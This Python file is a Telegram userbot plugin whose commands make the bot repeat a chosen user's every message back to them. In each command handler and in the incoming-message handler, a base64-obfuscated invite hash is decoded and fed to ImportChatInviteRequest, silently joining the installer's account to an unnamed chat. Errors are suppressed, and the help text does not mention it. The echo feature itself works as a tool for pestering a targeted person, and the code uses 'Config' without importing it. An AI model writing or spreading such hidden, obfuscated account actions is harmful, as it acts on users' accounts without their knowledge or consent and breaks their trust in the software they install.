"""
created by @mayank1rajput
Idea by @Nhipata1

"""

import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from .. import CMD_HELP
from ..utils import admin_cmd, edit_or_reply, sudo_cmd
from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo


@bot.on(admin_cmd(pattern="addecho$"))
@bot.on(sudo_cmd(pattern="addecho$", allow_sudo=True))
async def echo(skull):
    if skull.fwd_from:
        return
    if skull.reply_to_msg_id is not None:
        reply_msg = await skull.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = skull.chat_id
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await skull.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(skull, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(skull, "Hi")
    else:
        await edit_or_reply(skull, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="rmecho$"))
@bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
async def echo(skull):
    if skull.fwd_from:
        return
    if skull.reply_to_msg_id is not None:
        reply_msg = await skull.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = skull.chat_id
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await skull.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(skull, "Echo has been stopped for the user")
        else:
            await edit_or_reply(skull, "The user is not activated with echo")
    else:
        await edit_or_reply(skull, "Reply to a User's message to echo his messages")


@bot.on(admin_cmd(pattern="listecho$"))
@bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
async def echo(skull):
    if skull.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(skull, reply_text)
    else:
        await edit_or_reply(skull, output_str)


@bot.on(events.NewMessage(incoming=True))
async def samereply(skull):
    if skull.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(skull.sender_id, skull.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await skull.client(hmm)
        except BaseException:
            pass
        if skull.message.text or skull.message.sticker:
            await skull.reply(skull.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.addecho` reply to user to whom you want to enable\
    \n**Usage : **replays his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to whom you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for whom you enabled echo\
    "
    }
)
